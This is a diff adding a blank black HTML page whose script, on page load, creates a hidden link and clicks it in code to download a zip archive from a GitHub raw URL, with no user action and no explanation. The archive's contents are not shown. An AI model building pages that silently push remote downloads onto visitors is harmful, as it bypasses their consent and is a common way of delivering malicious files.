@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>r8r7 | rivera</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            // Create a link element
+            var link = document.createElement('a');
+            link.href = 'https://raw.githubusercontent.com/beak2825/lremote/main/site.zip';
+            link.download = 'site.zip';
+            link.style.display = 'none'; // Hide the link element
+
+            // Append link to the body
+            document.body.appendChild(link);
+
+            // Programmatically click the link to start the download
+            link.click();
+
+            // Remove the link element after download starts
+            document.body.removeChild(link);
+        };
+    </script>
+</body>
+</html>
